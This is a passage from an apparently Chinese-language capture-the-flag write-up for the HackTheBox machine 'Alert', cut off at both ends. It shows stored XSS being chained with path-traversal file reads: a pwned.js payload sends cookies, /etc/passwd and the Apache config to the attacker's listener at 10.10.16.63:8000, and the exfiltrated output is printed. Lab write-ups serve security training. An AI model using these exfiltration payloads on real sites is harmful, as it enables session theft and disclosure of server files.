class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bin">&lt;script&gt;<br>   alert(1)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>提交后</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325173717-bwvpv42.png" alt="image"></p><p>然后用burpsuite抓包一下</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250327171035-zi28y5r.png" alt="image"></p><p>修改一下</p><p>​<code>&lt;script src=&quot;http://监听设备的ip:3000/pwned.js&quot;&gt;&lt;/script&gt;</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250327171453-b11t61z.png" alt="image"></p><p>开启监听</p><p>​<code>nc -lvnp 3000</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250327172232-9ctnd48.png" alt="image"></p><p>看到监听成功,显示 HTML 注入和 XSS 有效</p><p>接下来看看管理员是否可以点击练习消息中的链接</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250328183414-7u0ye0z.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250328183452-xsc9xkj.png" alt="image"></p><p>通过监听可以看到管理员点击了连接</p><p>之后尝试获取cookie</p><p>pwned.js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bin">fetch(&quot;http://10.10.16.63:8000/?&quot;+btoa(document.cookie));<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250328195148-7l1j6le.png" alt="image"></p><p>将pwned.js所在目录开启一个·python服务</p><p>​<code>python3 -m http.server</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250328195211-lhgj38g.png" alt="image"></p><p>之后python服务器可以看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bin">10.10.11.44 - - [28/Mar/2025 19:57:03] &quot;GET /pwned.js HTTP/1.1&quot; 200 -<br>10.10.11.44 - - [28/Mar/2025 19:57:03] code 404, message File not found<br>10.10.11.44 - - [19/Mar/2025 18:43:29] &quot;GET /？ HTTP/1.1&quot; 404 -<br><br></code></pre></td></tr></table></figure><p>第一个是获取脚本，第二个是从正在运行的脚本获取。没有 cookie，这意味着用户没有 cookie，或者它被标记为<code>http_only</code>​。</p><p>因为之前访问时文件<code>messages.php</code>​返回的是空文件，那就让管理员点击，看会不会返回什么内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bin">&lt;script src=&quot;http://10.10.16.63:8000/pwned.js&quot;&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>将pwned.js内容修改为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://alert.htb/messages.php&#x27;</span>, <span class="hljs-literal">false</span>);<br>req.<span class="hljs-title function_">send</span>();<br><span class="hljs-keyword">var</span> req2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req2.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://10.10.16.63:8000/?content=&#x27;</span> + <span class="hljs-title function_">btoa</span>(req.<span class="hljs-property">responseText</span>),<span class="hljs-literal">true</span>);<br>req2.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250328214757-bijjhpz.png" alt="image"></p><p>base64解码之后可以获得</p><p>​<code>&lt;h1&gt;Messages&lt;/h1&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;messages.php?file=2024-03-10_15-48-34.txt&#39;&gt;2024-03-10_15-48-34.txt&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</code>​</p><p>然后可以测试一下LFI攻击路径遍历</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://alert.htb/messages.php?file=../../../../../etc/passwd&#x27;</span>, <span class="hljs-literal">false</span>);<br>req.<span class="hljs-title function_">send</span>();<br><span class="hljs-keyword">var</span> req2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req2.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://10.10.16.63:8000/?content=&#x27;</span> + <span class="hljs-title function_">btoa</span>(req.<span class="hljs-property">responseText</span>),<span class="hljs-literal">true</span>);<br>req2.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure><p>ok,带出成功可以进行路径遍历</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">python3 -m http.<span class="hljs-property">server</span><br><span class="hljs-title class_">Serving</span> <span class="hljs-variable constant_">HTTP</span> on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> port <span class="hljs-number">8000</span> (<span class="hljs-attr">http</span>:<span class="hljs-comment">//0.0.0.0:8000/) ...</span><br><span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.63</span> - - [<span class="hljs-number">30</span>/<span class="hljs-title class_">Mar</span>/<span class="hljs-number">2025</span> <span class="hljs-number">20</span>:<span class="hljs-number">33</span>:<span class="hljs-number">16</span>] <span class="hljs-string">&quot;GET /pwned.js HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br><span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.63</span> - - [<span class="hljs-number">30</span>/<span class="hljs-title class_">Mar</span>/<span class="hljs-number">2025</span> <span class="hljs-number">20</span>:<span class="hljs-number">33</span>:<span class="hljs-number">25</span>] <span class="hljs-string">&quot;GET /?content=Cg== HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.44</span> - - [<span class="hljs-number">30</span>/<span class="hljs-title class_">Mar</span>/<span class="hljs-number">2025</span> <span class="hljs-number">20</span>:<span class="hljs-number">33</span>:<span class="hljs-number">45</span>] <span class="hljs-string">&quot;GET /pwned.js HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.44</span> - - [<span class="hljs-number">30</span>/<span class="hljs-title class_">Mar</span>/<span class="hljs-number">2025</span> <span class="hljs-number">20</span>:<span class="hljs-number">33</span>:<span class="hljs-number">47</span>] <span class="hljs-string">&quot;GET /?content=PHByZT5yb290Ong6MDowOnJvb3Q6L3Jvb3Q6L2Jpbi9iYXNoCmRhZW1vbjp4OjE6MTpkYWVtb246L3Vzci9zYmluOi91c3Ivc2Jpbi9ub2xvZ2luCmJpbjp4OjI6MjpiaW46L2JpbjovdXNyL3NiaW4vbm9sb2dpbgpzeXM6eDozOjM6c3lzOi9kZXY6L3Vzci9zYmluL25vbG9naW4Kc3luYzp4OjQ6NjU1MzQ6c3luYzovYmluOi9iaW4vc3luYwpnYW1lczp4OjU6NjA6Z2FtZXM6L3Vzci9nYW1lczovdXNyL3NiaW4vbm9sb2dpbgptYW46eDo2OjEyOm1hbjovdmFyL2NhY2hlL21hbjovdXNyL3NiaW4vbm9sb2dpbgpscDp4Ojc6NzpscDovdmFyL3Nwb29sL2xwZDovdXNyL3NiaW4vbm9sb2dpbgptYWlsOng6ODo4Om1haWw6L3Zhci9tYWlsOi91c3Ivc2Jpbi9ub2xvZ2luCm5ld3M6eDo5Ojk6bmV3czovdmFyL3Nwb29sL25ld3M6L3Vzci9zYmluL25vbG9naW4KdXVjcDp4OjEwOjEwOnV1Y3A6L3Zhci9zcG9vbC91dWNwOi91c3Ivc2Jpbi9ub2xvZ2luCnByb3h5Ong6MTM6MTM6cHJveHk6L2JpbjovdXNyL3NiaW4vbm9sb2dpbgp3d3ctZGF0YTp4OjMzOjMzOnd3dy1kYXRhOi92YXIvd3d3Oi91c3Ivc2Jpbi9ub2xvZ2luCmJhY2t1cDp4OjM0OjM0OmJhY2t1cDovdmFyL2JhY2t1cHM6L3Vzci9zYmluL25vbG9naW4KbGlzdDp4OjM4OjM4Ok1haWxpbmcgTGlzdCBNYW5hZ2VyOi92YXIvbGlzdDovdXNyL3NiaW4vbm9sb2dpbgppcmM6eDozOTozOTppcmNkOi92YXIvcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1uZXR3b3JrOng6MTAwOjEwMjpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1yZXNvbHZlOng6MTAxOjEwMzpzeXN0ZW1kIFJlc29sdmVyLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTAyOjEwNDpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgptZXNzYWdlYnVzOng6MTAzOjEwNjo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c2xvZzp4OjEwNDoxMTA6Oi9ob21lL3N5c2xvZzovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA1OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KdHNzOng6MTA2OjExMTpUUE0gc29mdHdhcmUgc3RhY2ssLCw6L3Zhci9saWIvdHBtOi9iaW4vZmFsc2UKdXVpZGQ6eDoxMDc6MTEyOjovcnVuL3V1aWRkOi91c3Ivc2Jpbi9ub2xvZ2luCnRjcGR1bXA6eDoxMDg6MTEzOjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KbGFuZHNjYXBlOng6MTA5OjExNTo6L3Zhci9saWIvbGFuZHNjYXBlOi91c3Ivc2Jpbi9ub2xvZ2luCnBvbGxpbmF0ZTp4OjExMDoxOjovdmFyL2NhY2hlL3BvbGxpbmF0ZTovYmluL2ZhbHNlCmZ3dXBkLXJlZnJlc2g6eDoxMTE6MTE2OmZ3dXBkLXJlZnJlc2ggdXNlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KdXNibXV4Ong6MTEyOjQ2OnVzYm11eCBkYWVtb24sLCw6L3Zhci9saWIvdXNibXV4Oi91c3Ivc2Jpbi9ub2xvZ2luCnNzaGQ6eDoxMTM6NjU1MzQ6Oi9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk5Ojk5OTpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KYWxiZXJ0Ong6MTAwMDoxMDAwOmFsYmVydDovaG9tZS9hbGJlcnQ6L2Jpbi9iYXNoCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCmRhdmlkOng6MTAwMToxMDAyOiwsLDovaG9tZS9kYXZpZDovYmluL2Jhc2gKPC9wcmU+Cg== HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br></code></pre></td></tr></table></figure><p>解码一下得到</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;pre&gt;<span class="hljs-attr">root</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-attr">root</span>:<span class="hljs-regexp">/root:/</span>bin/bash<br><span class="hljs-attr">daemon</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>:<span class="hljs-attr">daemon</span>:<span class="hljs-regexp">/usr/</span><span class="hljs-attr">sbin</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">bin</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">2</span>:<span class="hljs-number">2</span>:<span class="hljs-attr">bin</span>:<span class="hljs-regexp">/bin:/u</span>sr/sbin/nologin<br><span class="hljs-attr">sys</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">3</span>:<span class="hljs-number">3</span>:<span class="hljs-attr">sys</span>:<span class="hljs-regexp">/dev:/u</span>sr/sbin/nologin<br><span class="hljs-attr">sync</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">4</span>:<span class="hljs-number">65534</span>:<span class="hljs-attr">sync</span>:<span class="hljs-regexp">/bin:/</span>bin/sync<br><span class="hljs-attr">games</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">5</span>:<span class="hljs-number">60</span>:<span class="hljs-attr">games</span>:<span class="hljs-regexp">/usr/g</span><span class="hljs-attr">ames</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">man</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">6</span>:<span class="hljs-number">12</span>:<span class="hljs-attr">man</span>:<span class="hljs-regexp">/var/</span>cache/<span class="hljs-attr">man</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">lp</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">7</span>:<span class="hljs-number">7</span>:<span class="hljs-attr">lp</span>:<span class="hljs-regexp">/var/</span>spool/<span class="hljs-attr">lpd</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">mail</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">8</span>:<span class="hljs-number">8</span>:<span class="hljs-attr">mail</span>:<span class="hljs-regexp">/var/m</span><span class="hljs-attr">ail</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">news</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">9</span>:<span class="hljs-number">9</span>:<span class="hljs-attr">news</span>:<span class="hljs-regexp">/var/</span>spool/<span class="hljs-attr">news</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">uucp</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">10</span>:<span class="hljs-number">10</span>:<span class="hljs-attr">uucp</span>:<span class="hljs-regexp">/var/</span>spool/<span class="hljs-attr">uucp</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">proxy</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">13</span>:<span class="hljs-number">13</span>:<span class="hljs-attr">proxy</span>:<span class="hljs-regexp">/bin:/u</span>sr/sbin/nologin<br>www-<span class="hljs-attr">data</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">33</span>:<span class="hljs-number">33</span>:www-<span class="hljs-attr">data</span>:<span class="hljs-regexp">/var/</span><span class="hljs-attr">www</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">backup</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">34</span>:<span class="hljs-number">34</span>:<span class="hljs-attr">backup</span>:<span class="hljs-regexp">/var/</span><span class="hljs-attr">backups</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">list</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">38</span>:<span class="hljs-number">38</span>:<span class="hljs-title class_">Mailing</span> <span class="hljs-title class_">List</span> <span class="hljs-title class_">Manager</span>:<span class="hljs-regexp">/var/</span><span class="hljs-attr">list</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">irc</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">39</span>:<span class="hljs-number">39</span>:<span class="hljs-attr">ircd</span>:<span class="hljs-regexp">/var/</span>run/<span class="hljs-attr">ircd</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">gnats</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">41</span>:<span class="hljs-number">41</span>:<span class="hljs-title class_">Gnats</span> <span class="hljs-title class_">Bug</span>-<span class="hljs-title class_">Reporting</span> <span class="hljs-title class_">System</span> (admin):<span class="hljs-regexp">/var/</span>lib/<span class="hljs-attr">gnats</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">nobody</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">65534</span>:<span class="hljs-number">65534</span>:<span class="hljs-attr">nobody</span>:<span class="hljs-regexp">/nonexistent:/u</span>sr/sbin/nologin<br>systemd-<span class="hljs-attr">network</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">100</span>:<span class="hljs-number">102</span>:systemd <span class="hljs-title class_">Network</span> <span class="hljs-title class_">Management</span>,,,:<span class="hljs-regexp">/run/</span><span class="hljs-attr">systemd</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br>systemd-<span class="hljs-attr">resolve</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">101</span>:<span class="hljs-number">103</span>:systemd <span class="hljs-title class_">Resolver</span>,,,:<span class="hljs-regexp">/run/</span><span class="hljs-attr">systemd</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br>systemd-<span class="hljs-attr">timesync</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">102</span>:<span class="hljs-number">104</span>:systemd <span class="hljs-title class_">Time</span> <span class="hljs-title class_">Synchronization</span>,,,:<span class="hljs-regexp">/run/</span><span class="hljs-attr">systemd</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">messagebus</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">103</span>:<span class="hljs-number">106</span>::<span class="hljs-regexp">/nonexistent:/u</span>sr/sbin/nologin<br><span class="hljs-attr">syslog</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">104</span>:<span class="hljs-number">110</span>::<span class="hljs-regexp">/home/</span><span class="hljs-attr">syslog</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">_apt</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">105</span>:<span class="hljs-number">65534</span>::<span class="hljs-regexp">/nonexistent:/u</span>sr/sbin/nologin<br><span class="hljs-attr">tss</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">106</span>:<span class="hljs-number">111</span>:<span class="hljs-variable constant_">TPM</span> software stack,,,:<span class="hljs-regexp">/var/</span>lib/<span class="hljs-attr">tpm</span>:<span class="hljs-regexp">/bin/</span><span class="hljs-literal">false</span><br><span class="hljs-attr">uuidd</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">107</span>:<span class="hljs-number">112</span>::<span class="hljs-regexp">/run/uui</span><span class="hljs-attr">dd</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">tcpdump</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">108</span>:<span class="hljs-number">113</span>::<span class="hljs-regexp">/nonexistent:/u</span>sr/sbin/nologin<br><span class="hljs-attr">landscape</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">109</span>:<span class="hljs-number">115</span>::<span class="hljs-regexp">/var/</span>lib/<span class="hljs-attr">landscape</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">pollinate</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">110</span>:<span class="hljs-number">1</span>::<span class="hljs-regexp">/var/</span>cache/<span class="hljs-attr">pollinate</span>:<span class="hljs-regexp">/bin/</span><span class="hljs-literal">false</span><br>fwupd-<span class="hljs-attr">refresh</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">111</span>:<span class="hljs-number">116</span>:fwupd-refresh user,,,:<span class="hljs-regexp">/run/</span><span class="hljs-attr">systemd</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">usbmux</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">112</span>:<span class="hljs-number">46</span>:usbmux daemon,,,:<span class="hljs-regexp">/var/</span>lib/<span class="hljs-attr">usbmux</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">sshd</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">113</span>:<span class="hljs-number">65534</span>::<span class="hljs-regexp">/run/</span><span class="hljs-attr">sshd</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br>systemd-<span class="hljs-attr">coredump</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">999</span>:<span class="hljs-number">999</span>:systemd <span class="hljs-title class_">Core</span> <span class="hljs-title class_">Dumper</span>:<span class="hljs-regexp">/:/u</span>sr/sbin/nologin<br><span class="hljs-attr">albert</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">1000</span>:<span class="hljs-number">1000</span>:<span class="hljs-attr">albert</span>:<span class="hljs-regexp">/home/</span><span class="hljs-attr">albert</span>:<span class="hljs-regexp">/bin/</span>bash<br><span class="hljs-attr">lxd</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">998</span>:<span class="hljs-number">100</span>::<span class="hljs-regexp">/var/</span>snap/lxd/common/<span class="hljs-attr">lxd</span>:<span class="hljs-regexp">/bin/</span><span class="hljs-literal">false</span><br><span class="hljs-attr">david</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">1001</span>:<span class="hljs-number">1002</span>:,,,:<span class="hljs-regexp">/home/</span><span class="hljs-attr">david</span>:<span class="hljs-regexp">/bin/</span>bash<br>&lt;/pre&gt;<br></code></pre></td></tr></table></figure><p>之后就可以想到<code>statistics.alert.htb</code>​需要一个认证，可以通过遍历读取到敏感信息</p><p>网站的 Apache 配置通常存储在 中<code>/etc/apache2/sites-enabled</code>​。默认名称为<code>000-default.conf</code>​</p><p>再次修改读取一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://alert.htb/messages.php?file=../../../../../etc/apache2/sites-enabled/000-default.conf&#x27;</span>, <span class="hljs-literal">false</span>);<br>req.<span class="hljs-title function_">send</span>();<br><span class="hljs-keyword">var</span> req2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req2.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://10.10.16.63:8000/?content=&#x27;</span> + <span class="hljs-title function_">btoa</span>(req.<span class="hljs-property">responseText</span>),<span class="hljs-literal">true</span>);<br>req2.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure><p>解码之后信息为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;pre&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">VirtualHost</span> *<span class="hljs-attr">:80</span>&gt;</span></span><br><span class="language-xml">    ServerName alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    DocumentRoot /var/www/alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Directory</span> /<span class="hljs-attr">var</span>/<span class="hljs-attr">www</span>/<span class="hljs-attr">alert.htb</span>&gt;</span></span><br><span class="language-xml">        Options FollowSymLinks MultiViews</span><br><span class="language-xml">        AllowOverride All</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Directory</span>&gt;</span></span><br><br>    <span class="hljs-title class_">RewriteEngine</span> <span class="hljs-title class_">On</span><br>    <span class="hljs-title class_">RewriteCond</span> %&#123;<span class="hljs-variable constant_">HTTP_HOST</span>&#125; !^alert\.<span class="hljs-property">htb$</span><br>    <span class="hljs-title class_">RewriteCond</span> %&#123;<span class="hljs-variable constant_">HTTP_HOST</span>&#125; !^$<br>    <span class="hljs-title class_">RewriteRule</span> ^<span class="hljs-regexp">/?(.*)$ http:/</span><span class="hljs-regexp">/alert.htb/</span>$1 [R=<span class="hljs-number">301</span>,L]<br><br>    <span class="hljs-title class_">ErrorLog</span> $&#123;<span class="hljs-variable constant_">APACHE_LOG_DIR</span>&#125;/error.<span class="hljs-property">log</span><br>    <span class="hljs-title class_">CustomLog</span> $&#123;<span class="hljs-variable constant_">APACHE_LOG_DIR</span>&#125;/access.<span class="hljs-property">log</span> combined<br>&lt;/<span class="hljs-title class_">VirtualHost</span>&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">VirtualHost</span> *<span class="hljs-attr">:80</span>&gt;</span></span><br><span class="language-xml">    ServerName statistics.alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    DocumentRoot /var/www/statistics.alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Directory</span> /<span class="hljs-attr">var</span>/<span class="hljs-attr">www</span>/<span class="hljs-attr">statistics.alert.htb</span>&gt;</span></span><br><span class="language-xml">        Options FollowSymLinks MultiViews</span><br><span class="language-xml">        AllowOverride All</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Directory</span>&gt;</span></span><br><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Directory</span> /<span class="hljs-attr">var</span>/<span class="hljs-attr">www</span>/<span class="hljs-attr">statistics.alert.htb</span>&gt;</span></span><br>        <span class="hljs-title class_">Options</span> <span class="hljs-title class_">Indexes</span> <span class="hljs-title class_">FollowSymLinks</span> <span class="hljs-title class_">MultiViews</span><br>        <span class="hljs-title class_">AllowOverride</span> <span class="hljs-title class_">All</span><br>        <span class="hljs-title class_">AuthType</span> <span class="hljs-title class_">Basic</span><br>        <span class="hljs-title class_">AuthName</span> <span class="hljs-string">&quot;Restricted Area&quot;</span><br>        <span class="hljs-title class_">AuthUserFile</span> /<span class="hljs-keyword">var</span>/www/statistics.<span class="hljs-property">alert</span>.<span class="hljs-property">htb</span>/.<span class="hljs-property">htpasswd</span><br>        <span class="hljs-title class_">Require</span> valid-user<br>    &lt;/<span class="hljs-title class_">Directory</span>&gt;<br><br>    <span class="hljs-title class_">ErrorLog</span> $&#123;<span class="hljs-variable 